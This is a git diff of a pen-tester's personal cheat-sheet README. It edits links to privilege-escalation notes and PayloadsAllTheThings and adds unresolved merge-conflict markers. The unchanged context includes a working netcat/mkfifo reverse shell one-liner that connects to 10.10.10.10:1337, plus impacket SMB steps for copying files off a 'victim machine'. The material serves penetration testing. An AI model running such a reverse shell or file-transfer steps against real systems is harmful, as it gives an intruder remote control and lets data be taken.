@@ -2,11 +2,12 @@
 Here are some commands, reverse shells, and small scripts that I keep for pen-testing.
 
 ## Quick Links
-[Linux Privilege Escalation](LinuxPrivEsc/README.md)
+[Linux Privilege Escalation](LinuxPrivEsc/README.md) <br>
 [Windows Privilege Escalation](WindowsPrivEsc/README.md)
-[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-[Web Penetration Testing Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
+[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+
+[Web Penetration Testing Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
 ## Reverse Shell
 Alternate ways to gain shells.
@@ -23,6 +24,7 @@ Probably the least-special-characters way (and with sh):
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337 > /tmp/f
 ```
+<<<<<<< HEAD
 
 ### Windows
 Using impacket-smbserver we can copy files to and from the victim machine. Start the impacket-smbserver:
@@ -39,3 +41,5 @@ To copy files from Windows to Kali:
 ```cmd
 > copy file.ext \\<Kali IP>\leet\file.ext
 ```
+=======
+>>>>>>> 0efa152bd1d9f18ec2a406fff9473fbdf9c8e604
